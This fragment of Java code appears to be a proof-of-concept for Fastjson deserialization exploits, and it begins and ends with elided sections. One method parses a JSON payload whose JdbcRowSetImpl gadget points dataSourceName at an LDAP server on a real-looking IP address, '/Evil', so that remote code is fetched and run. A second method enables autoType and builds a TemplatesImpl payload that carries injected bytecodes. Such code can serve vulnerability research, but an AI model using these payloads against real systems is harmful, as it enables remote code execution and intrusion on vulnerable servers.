...
//        getByteCodes();
    ...
    public static void JdbcRowSetImpl(){
        ...
        String s1 = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://139.9.134.169:1100/Evil\",\"autoCommit\":true}";
        JSON.parseObject(s1);
    }
    public static void TemplatesImpl() throws NotFoundException, CannotCompileException, IOException {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s1 = String.format("{\"@type\":\"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\",\"_bytecodes\":[\"%s\"],'_name':'exp','_tfactory':{ },\"_outputProperties\":{ }}", getByteCodes());
